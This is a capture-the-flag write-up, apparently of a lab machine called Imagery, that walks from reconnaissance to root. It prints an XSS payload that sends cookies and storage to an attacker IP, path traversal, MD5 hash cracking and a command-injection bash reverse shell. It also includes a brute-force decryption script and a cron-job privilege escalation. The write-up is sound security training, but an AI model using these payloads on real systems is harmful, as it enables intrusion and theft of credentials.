we start with a nmap scan and we find a website on port 8000 for an image gallery

- Discovered open port 22/tcp on 10.129.6.108
- Discovered open port 8000/tcp on 10.129.6.108

on the homepage, we find out more about the website features that we could exploit

- upload via web link is possible
- gallery is stored locally

we also find out about what web server is used with whatweb

- Werkzeug/3.1.3 Python/3.12.7

we scan for directories using gobuster

- /images (Status: 401) [Size: 59]
- /login (Status: 405) [Size: 153]
- /register (Status: 405) [Size: 153]
- /logout (Status: 405) [Size: 153]
- /upload_image (Status: 405) [Size: 153]

once we register, we find a new upload page

- POST http://imagery.htb:8000/upload_image

we can also download the images we upload
we try to fuzz the download url with lfi wordlist

- GET http://imagery.htb:8000/uploads/743829f7-5bf0-4d91-b4a8-4a700f462dcc_image.jpg

in the footer, we find a "Report Bug" link.
we could maybe exploit this with a XSS attack (if the admin review the bug reports)

- POST http://imagery.htb:8000/report_bug

we also find the following links in the network tab

- http://imagery.htb:8000/auth_status?_t=1759358655988 (we also try to fuzz is with ffuf)
- http://imagery.htb:8000/get_image_collections

in the storage tab, we find a "session" cookie

- .eJyrVkrJLC7ISaz0TFGyUkpKTDRKMjI2VdJRyix2TMnNzFOySkvMKU4F8eMzcwtSi4rz8xJLMvPS40tSi0tKi1OLkFXAxOITk5PzS_NK4HIgwbzE3FSgHSA1Dkn5FXoZJUlKtQBlky42.aN2l6w.1mN81fX66t2BsoM4SaWkn-L-vCQ

there is also a lastVisitedPage in the local storage since the URL doesn't change when changing pages

since this is a Werkzeug app, we try the /console url for the debugger, but it is not enabled

looking at the source code, we find a few interesting things:

Pages:

- adminPanel

Functions:

- navigateTo
- checkAuthStatus
- loadAdminPanelContent

Variables:

- isAdmin
- loggedInUserIsTestUser
- loggedInEmail
- loggedInUserDisplayId

Test Endpoints

- /edit_image_details
- /convert_image
- /apply_visual_transform
- /delete_image_metadata
- /move_images_to_collection
- /create_image_collection

Admin Endpoints

- /admin/users
- /admin/bug_reports
- /admin/delete_user
- /admin/delete_bug_report
- /admin/get_system_log

we try to access the admin panel by overriding some variables and functions:

```javascript
// Set admin flags
isAdmin = true;
loggedInUserIsTestUser = true;
loggedInEmail = "test@test.com";
loggedInUserDisplayId = "ADMIN";

// Override the checkAuthStatus function
checkAuthStatus = async function (updateUI = true) {
  return { loggedIn: true, isAdmin: true, isTestuser: true };
};

// Navigate to admin panel
document.getElementById("adminPanelPage").style.display = "flex";
document.getElementById("admin-not-logged-in").style.display = "none";
document.getElementById("admin-content-wrapper").style.display = "block";

// Try to directly call admin functions
navigateTo("adminPanel");
```

but we get a 403 forbidden on http://imagery.htb:8000/admin/users but now if we go back to the gallery we can access the test features

looking at the "Convert Image" feature, we can see that we could convert an image to pdf, which could be an attack vector
sadly, we get a 403 forbidden for all the test features

since we can't bypass the checks, we focus back on the XSS attack using the bug reports.
looking at the source code, we can see that all fields are sanitized using DOMPurify.sanitize() except one: report.details
we can exploit this to steal the admin cookies

```html
<img
  src="x"
  onerror="(async function(){
  const YOUR_SERVER_IP = '10.10.15.79';
  
  try {
    // Collect User-Agent
    let userAgent = navigator.userAgent;
    
    // Collect Cookies
    let cookies = document.cookie;
    
    // Collect Local Storage Data
    let localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      let key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    // Collect Session Storage Data
    let sessionStorageData = {};
    for (let i = 0; i < sessionStorage.length; i++) {
      let key = sessionStorage.key(i);
      sessionStorageData[key] = sessionStorage.getItem(key);
    }
    
    // Collect Document Properties
    let documentData = {
      title: document.title,
      url: document.URL,
      referrer: document.referrer,
      domain: document.domain
    };
    
    // Create final data object matching your listener's structure
    let data = {
      userAgent: userAgent,
      cookies: cookies,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      document: documentData,
      fileContents: 'N/A - file:// not accessible from browser context'
    };
    
    // Send the data to your server with allData parameter
    let img = new Image();
    img.src = 'http://' + YOUR_SERVER_IP + ':5555/?allData=' + encodeURIComponent(JSON.stringify(data));
    
  } catch (error) {
    let img = new Image();
    img.src = 'http://' + YOUR_SERVER_IP + ':5555/?error=' + encodeURIComponent(error.toString());
  }
})()"
/>
```

once we are logged in as admin, we get access to a "Download Log" button.
http://imagery.htb:8000/admin/get_system_log?log_identifier=admin@imagery.htb.log

we try to fuzz the get_system_log url with lfi wordlist and we are able to display /etc/passwd
http://imagery.htb:8000/admin/get_system_log?log_identifier=../../../../../../../etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
mark:x:1002:1002::/home/mark:/bin/bash
web:x:1001:1001::/home/web:/bin/bash
```

we can also get the app python files
http://imagery.htb:8000/admin/get_system_log?log_identifier=../app.py
api_admin.py
api_auth.py
api_edit.py
api_manage.py
api_misc.py
api_upload.py
app.py
config.py
utils.py

in utils.py, we find how the passwords are hashed

```python
def _hash_password(password):
    return hashlib.md5(password.encode()).hexdigest()
```

in config.py, we find the name of the database file

```python
DATA_STORE_PATH = 'db.json'
```

we can download the db file
http://imagery.htb:8000/admin/get_system_log?log_identifier=../db.json

```json
{
  "users": [
    {
      "username": "admin@imagery.htb",
      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
      "isAdmin": true,
      "displayId": "a1b2c3d4",
      "login_attempts": 0,
      "isTestuser": false,
      "failed_login_attempts": 0,
      "locked_until": null
    },
    {
      "username": "testuser@imagery.htb",
      "password": "2c65c8d7bfbca32a3ed42596192384f6",
      "isAdmin": false,
      "displayId": "e5f6g7h8",
      "login_attempts": 0,
      "isTestuser": true,
      "failed_login_attempts": 0,
      "locked_until": null
    }
  ]
}
```

now that we have the hash type (md5) and the hashes, we can try to crack them with hashcat

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4
2c65c8d7bfbca32a3ed42596192384f6:iambatman
```

now that we cracked the testuser@imagery.htb hash, we can login with his account and access the test features

after analyzing the source code in more details, we find a vulnerability in api_edit.py:44 (shell=True)

```python
command = f"{IMAGEMAGICK_CONVERT_PATH} {original_filepath} -crop {width}x{height}+{x}+{y} {output_filepath}"
subprocess.run(command, capture_output=True, text=True, shell=True, check=True)
```

we can exploit it with the following payload in burp
nc -lvnp 1234

```json
{
  "imageId": "ec8b0bef-73e6-436b-bcc2-cc933c05fec1",
  "transformType": "crop",
  "params": {
    "x": "0",
    "y": "0",
    "width": "100",
    "height": "100; bash -c 'bash -i >& /dev/tcp/10.10.15.79/1234 0>&1'; #"
  }
}
```

once we are logged in, we can check the directories in the web user home

in bot/admin.py, we find a password, but it doesn't work for the user mark

```bash
CHROME_BINARY = "/usr/bin/google-chrome"
USERNAME = "admin@imagery.htb"
PASSWORD = "strongsandofbeach"
BYPASS_TOKEN = "K7Zg9vB$24NmW!q8xR0p%tL!"
APP_URL = "http://0.0.0.0:8000"
```

after that, we can run linpeas and find interesting files (web_20250806_120723.zip.aes) and services (flaskapp.service)

```bash
flaskapp.service loaded active running Flask Application Service
Potential issue in service: flaskapp.service
└─ SENSITIVE_ENV: Contains sensitive environment variables

flaskapp.service: Uses relative path 'app.py' (from ExecStart=/home/web/web/env/bin/python app.py)

Files with capabilities (limited to 50):
/snap/snapd/24792/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p
/snap/snapd/25202/usr/lib/snapd/snap-confine cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_sys_chroot,cap_sys_ptrace,cap_sys_admin=p

/var/backup/web_20250806_120723.zip.aes
```

we check the flaskapp.service

```bash
● flaskapp.service - Flask Application Service
Loaded: loaded (/etc/systemd/system/flaskapp.service; enabled; preset: enabled)
Active: active (running) since Wed 2025-10-01 23:09:39 UTC; 4h 10min ago
Invocation: 4020a688a5404e47aad047c747ddb726
Main PID: 1403 (python)
Tasks: 18 (limit: 4547)
Memory: 576.7M (peak: 605.5M)
CPU: 2min 38.754s
CGroup: /system.slice/flaskapp.service
├─ 1403 /home/web/web/env/bin/python app.py
├─37262 /bin/sh -c "/usr/bin/convert uploads/f4b0719d-f653-4588-acae-6240e74e49a3_image.png -crop 100x100; bash -c 'bash -i >& /dev/tcp/10.10.15.79/1234 0>&1'; #+0+0 uploads/admin/transformed/transformed_b1113b4b-de88-4afc-86dc-59c7d6d4ec73.png"
├─37264 bash -c "bash -i >& /dev/tcp/10.10.15.79/1234 0>&1"
├─37265 bash -i
├─42023 nc 10.10.15.79 9002
├─62645 bash -c "((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo \"DNS accessible\") | grep \"accessible\" && exit 0 ) 2>/dev/null || echo \"DNS is not accessible\""
├─62647 bash -c "((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo \"DNS accessible\") | grep \"accessible\" && exit 0 ) 2>/dev/null || echo \"DNS is not accessible\""
├─62649 grep accessible
├─62650 bash -c "((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo \"DNS accessible\") | grep \"accessible\" && exit 0 ) 2>/dev/null || echo \"DNS is not accessible\""
├─62654 dd bs=9000 count=1
├─62655 xxd
├─64649 gpg-agent --homedir /home/web/.gnupg --use-standard-socket --daemon
├─83170 /bin/sh -c "/usr/bin/convert uploads/475838e0-db6f-4c9a-add1-e3d304e2186c_image.png -crop 100x100; bash -c 'bash -i >& /dev/tcp/10.10.15.79/1234 0>&1'; #+0+0 uploads/admin/transformed/transformed_feaae957-bf4e-4647-8a8b-f9008e2854ca.png"
├─83172 bash -c "bash -i >& /dev/tcp/10.10.15.79/1234 0>&1"
├─83173 bash -i
└─83181 systemctl status flaskapp.service


web@Imagery:~/web$ cat /etc/systemd/system/flaskapp.service
cat /etc/systemd/system/flaskapp.service
[Unit]
Description=Flask Application Service
After=network.target

[Service]
User=web
Group=web
WorkingDirectory=/home/web/web
Environment="PATH=/home/web/web/env/bin:/sbin:/usr/bin"
Environment="CRON_BYPASS_TOKEN=K7Zg9vB$24NmW!q8xR0p%tL!"
ExecStart=/home/web/web/env/bin/python app.py

Restart=always

[Install]
WantedBy=multi-user.target
```

since the flask app did not yield any result, we try the encrypted backup we found earlier with linpeas

first, we need to figure out how it was encrypted with hexdump

```bash
hexdump -C backup.zip.aes | head -n 5
00000000  41 45 53 02 00 00 1b 43  52 45 41 54 45 44 5f 42  |AES....CREATED_B|
00000010  59 00 70 79 41 65 73 43  72 79 70 74 20 36 2e 31  |Y.pyAesCrypt 6.1|
00000020  2e 31 00 80 00 00 00 00  00 00 00 00 00 00 00 00  |.1..............|
00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
*
```

we find out that it was encrypted using pyaescrypt.
to decrypt it, we can create a custom python script using the pyaescrypt library and rockyou.txt

```python
#!/usr/bin/env python3
import pyAesCrypt
import sys

def crack_password(encrypted_file, wordlist, output_file):
    buffer_size = 64 * 1024

    with open(wordlist, 'r', encoding='latin-1', errors='ignore') as wl:
        for i, password in enumerate(wl, 1):
            password = password.strip()

            if i % 100 == 0:
                print(f"[*] Tried {i} passwords...", end='\r')

            try:
                pyAesCrypt.decryptFile(
                    encrypted_file,
                    output_file,
                    password,
                    buffer_size
                )
                print(f"\n[+] SUCCESS! Password: {password}")
                return password
            except ValueError:
                continue
            except Exception as e:
                continue

    print("\n[-] Password not found")
    return None

if __name__ == "__main__":
    crack_password("backup.zip.aes", "/home/bhugo97/.pentest-toolbox/wordlists/rockyou.txt", "backup.zip")
```

once the script is created, we can run it
python decrypt.py

```bash
[*] Tried 600 passwords...
[+] SUCCESS! Password: bestfriends
```

bingo !
since the backup is decrypted, we can look inside the .zip
inside the .zip, we find another db.json, but this time it has the user mark

```json
{
  "users": [
    {
      "username": "admin@imagery.htb",
      "password": "5d9c1d507a3f76af1e5c97a3ad1eaa31",
      "displayId": "f8p10uw0",
      "isTestuser": false,
      "isAdmin": true,
      "failed_login_attempts": 0,
      "locked_until": null
    },
    {
      "username": "testuser@imagery.htb",
      "password": "2c65c8d7bfbca32a3ed42596192384f6",
      "displayId": "8utz23o5",
      "isTestuser": true,
      "isAdmin": false,
      "failed_login_attempts": 0,
      "locked_until": null
    },
    {
      "username": "mark@imagery.htb",
      "password": "01c3d2e5bdaf6134cec0a367cf53e535",
      "displayId": "868facaf",
      "isAdmin": false,
      "failed_login_attempts": 0,
      "locked_until": null,
      "isTestuser": false
    },
    {
      "username": "web@imagery.htb",
      "password": "84e3c804cf1fa14306f26f9f3da177e0",
      "displayId": "7be291d4",
      "isAdmin": true,
      "failed_login_attempts": 0,
      "locked_until": null,
      "isTestuser": false
    }
  ]
}
```

we can now crack his password using hashcat

```bash
hashcat -m 0 -a 0 hash.txt rockyou.txt -w 4

01c3d2e5bdaf6134cec0a367cf53e535:supersmash
```

now that we have mark password, we can get the user flag.

once we got the user flag, we can run linpeas again as mark
we find a command that we can run as root

```bash
User mark may run the following commands on Imagery:
    (ALL) NOPASSWD: /usr/local/bin/charcol
```

if we try to backup the flag at /root/root.txt directly, we get an error (even with a symlink).

```bash
charcol> backup -i /etc/shadow
[2025-10-03 01:01:16] [ERROR] Blocking direct access to critical system file: '/root/root.txt'
[2025-10-03 01:01:16] [ERROR] Operation aborted: Input path '/root/root.txt' is a blocked critical system location. Skipping this path.
```

looking at charcol help command, we see the following

```bash
auto add --schedule "<cron_schedule>" --command "<shell_command>" --name "<job_name>" [--log-output <log_file>]
    Purpose: Add a new automated cron job managed by Charcol.
    Verification:
    - If '--app-password' is set (status 1): Requires Charcol application password (via global --app-password flag).
    - If 'no password' mode is set (status 2): Requires system password verification (in interactive shell).
    Security Warning: Charcol does NOT validate the safety of the --command. Use absolute paths.
```

we can try to add a cron job

```bash
auto add --schedule "* * * * *" --command "cat /root/root.txt > /tmp/flag.txt && chmod 644 /tmp/flag.txt" --name "getflag"
```

and bingo ! we got the root flag
